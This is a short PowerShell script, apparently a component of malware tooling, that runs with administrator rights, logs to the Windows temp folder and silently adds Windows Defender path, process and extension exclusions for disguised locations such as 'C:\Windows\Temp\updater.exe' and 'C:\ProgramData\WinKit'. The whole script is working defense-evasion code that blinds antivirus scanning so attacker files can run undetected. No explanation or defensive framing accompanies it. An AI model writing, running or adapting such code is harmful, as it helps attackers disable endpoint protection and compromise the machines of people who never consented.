# ----------------------------------------
# AUTO-RUNNING BOOT SCRIPT DESIGN (script.ps1)
# ----------------------------------------

# Check if running as Administrator or SYSTEM
function Is-Admin {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

if (-not (Is-Admin)) {
    Write-Output "[-] Not running as admin. Exiting..."
    exit 1
}

# Optional: Log run to file
$logPath = "C:\Windows\Temp\boot_exec_log.txt"
Add-Content -Path $logPath -Value "script.ps1 ran at $(Get-Date)"

# Add Defender exclusions
$exclusions = @(
    "C:\Users\Public\SystemLib",
    "C:\Windows\Temp\updater.exe",
    "C:\ProgramData\WinKit"
)

foreach ($excl in $exclusions) {
    try {
        Add-MpPreference -ExclusionPath $excl -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess $excl -ErrorAction SilentlyContinue
        $ext = [System.IO.Path]::GetExtension($excl).TrimStart(".")
        if ($ext) {
            Add-MpPreference -ExclusionExtension $ext -ErrorAction SilentlyContinue
        }
        Add-Content $logPath "Exclusion added: $excl"
    } catch {
        Add-Content $logPath "Failed to add exclusion: $excl - $_"
    }
}


